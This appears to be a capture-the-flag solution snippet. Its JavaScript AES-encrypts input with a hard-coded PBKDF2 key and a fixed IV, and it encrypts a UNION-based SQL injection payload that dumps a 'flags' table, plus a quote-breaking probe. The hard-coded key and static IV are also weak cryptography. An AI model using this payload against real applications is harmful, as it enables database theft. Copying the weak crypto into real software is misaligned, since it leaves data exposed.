<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<script>
    function getKey(passphrase, salt){
    var key = CryptoJS.PBKDF2(passphrase, salt, {
        hasher: CryptoJS.algo.SHA256,
        keySize: 64 / 8,
        iterations: 100
    });
    return key;
}

function encrypt(data){

    var key = getKey("Team5", "salt");

    var encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: CryptoJS.enc.Utf8.parse("1222112927754683")
    });

    return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
}
console.log(encrypt("nake'#"))
console.log(encrypt("a' union select null,group_concat(flag),null,null,null,null,null from flags#"))
</script>
<?php

?>